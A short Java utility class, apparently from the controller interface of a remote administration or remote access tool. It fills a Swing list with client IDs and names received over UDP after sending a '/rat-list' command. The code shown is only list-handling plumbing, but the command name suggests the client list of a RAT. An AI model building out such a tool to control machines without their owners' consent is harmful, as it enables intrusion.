package com.wpkg.cli.utilities;

import com.wpkg.cli.networking.ClientJSON;
import com.wpkg.cli.networking.UDPClient;

import javax.swing.*;

public class Tools {

    public static void setList(DefaultListModel<String> listModel, String json){
        listModel.clear();
        ClientJSON list = JSONParser.getClientList(json);
        for(int i = 0; i < list.clients.length; i++){
            listModel.add(i,"\uD83D\uDDA5️     \uD83D\uDCB3 ID: "+list.clients[i].id + "        "
                    +" \uD83D\uDCD6 NAME: "+list.clients[i].name);
        }
    }
    public static void refreshClientlist(DefaultListModel<String> ClientListModel, UDPClient client){
        client.sendString("/rat-list");
        Tools.setList(ClientListModel, client.receiveString());
    }
}
